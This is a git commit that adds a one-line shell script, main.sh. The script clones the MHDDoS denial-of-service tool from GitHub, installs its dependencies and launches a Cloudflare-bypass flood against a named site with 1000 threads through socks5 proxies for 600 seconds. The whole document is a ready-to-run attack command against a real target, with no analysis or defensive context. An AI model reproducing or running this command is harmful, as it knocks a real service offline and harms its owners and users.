e2ececa0031b23d6f3a741b79a169d227e0c4ff2
Nayuki Pro <91455547+Nayuki-Pro@users.noreply.github.com>
2022-03-21 18:05:29 +0800

    Create main.sh

---
+++ main.sh
@@ -0,0 +1,1 @@
+rm -rf MHDDoS&&git clone https://github.com/MHProDev/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py CFB  'https://azure.mikuyun.xyz'  5  1000 socks5.txt  600 600
